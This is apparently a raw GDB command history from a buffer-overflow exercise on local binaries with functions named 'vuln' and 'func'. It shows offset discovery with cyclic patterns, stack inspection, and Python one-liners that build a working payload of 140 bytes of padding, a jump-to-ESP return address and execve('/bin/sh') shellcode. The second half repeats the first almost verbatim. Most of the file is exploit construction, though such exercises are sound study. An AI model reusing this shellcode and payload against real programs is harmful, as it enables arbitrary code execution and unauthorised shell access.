disas vuln
start
disas vuln
disas func
b *func+31
run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
n
n
run `python -c 'print "A"*52+"BBBB"'`
n
run `python -c 'print "DDDD"+"A"*(52-8)+"CCCC"+"BBBB"'`
n
disas func
b *func+18
run `python -c 'print "DDDD"+"A"*(52-8)+"CCCC"+"BBBB"'`
n
disas main
b *main+84
run `python -c 'print "DDDD"+"A"*(52-8)+"CCCC"+"BBBB"'`
s
n
x/32x 0xbffff310
run `python -c 'print "DDDD"+"A"*(52-8)+"CCCC"+"BBBB"'`
s
n
x/32x 0xbffff310
x/1s 0xbffff310
x/32x 0xbffff310
run `python -c 'print "DDDD"+"A"*(52-8)+"CCCC"+"BBBB"'`
x/32x 0xbffff310
s
x/1x 0xbffff310
n
x/1x 0xbffff310
n
x/1x 0xbffff310
n
x/1x 0xbffff310
n
x/1x 0xbffff310
x/4x 0xbffff310
x/16x 0xbffff310
run `python -c 'print "DDDD"+"A"*(52-8)+"CCCC"+"BBBB"'`
s
n
x/16x 0xbffff310
n
0xbffff310
0xbffff310Ax/1x
x/1x 0xbffff310A
x/1x 0xbffff310
run `python -c 'print "DDDD"+"A"*(20)+"CCCC"+"BBBB"'`
s
x/16x 0xbffff330
n
x/16x 0xbffff330
run `python -c 'print "DDDD"+"A"*(52-8)+"CCCC"+"BBBB"'`
quit()
start
main
disas main
run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
n
quit
start
disas vuln
b *vuln+54
run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
n
n
run `python -c 'print "DDDD" + "A"*(140-8)+"CCCC"+"BBBB"'`
n
b *func
b *vuln
run `python -c 'print "DDDD" + "A"*(140-8)+"CCCC"+"BBBB"'`
x/1x 0xbffff2c0
n
x/1x 0xbffff2c0
n
x/1x 0xbffff2c0
n
x/1x 0xbffff2c0
n
x/1x 0xbffff2c0
run `python -c 'shellcode = "\xeb\x18\x5e\x31\xc0\x88\x46\x07" \' `
run `python -c 'shellcode = shellcode = "\xeb\x18\x5e\x31\xc0\x88\x46\x07" \'`
run  `python -c 'shellcode = "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"; relleno = "A" * 140; jmpesp = pack("<L", 0x0804844e); payload = relleno + jmpesp + shellcode; print payload' `
run  `python -c 'from struct import *; from subprocess import *; shellcode = "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"; relleno = "A" * 140; jmpesp = pack("<L", 0x0804844e); payload = relleno + jmpesp + shellcode; print payload' `
n
c
start
disas vuln
b *vuln+54
run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
n
n
run `python -c 'print "DDDD" + "A"*(140-8)+"CCCC"+"BBBB"'`
n
b *func
b *vuln
run `python -c 'print "DDDD" + "A"*(140-8)+"CCCC"+"BBBB"'`
x/1x 0xbffff2c0
n
x/1x 0xbffff2c0
n
x/1x 0xbffff2c0
n
x/1x 0xbffff2c0
n
x/1x 0xbffff2c0
run `python -c 'shellcode = "\xeb\x18\x5e\x31\xc0\x88\x46\x07" \' `
run `python -c 'shellcode = shellcode = "\xeb\x18\x5e\x31\xc0\x88\x46\x07" \'`
run  `python -c 'shellcode = "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"; relleno = "A" * 140; jmpesp = pack("<L", 0x0804844e); payload = relleno + jmpesp + shellcode; print payload' `
run  `python -c 'from struct import *; from subprocess import *; shellcode = "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"; relleno = "A" * 140; jmpesp = pack("<L", 0x0804844e); payload = relleno + jmpesp + shellcode; print payload' `
n
c
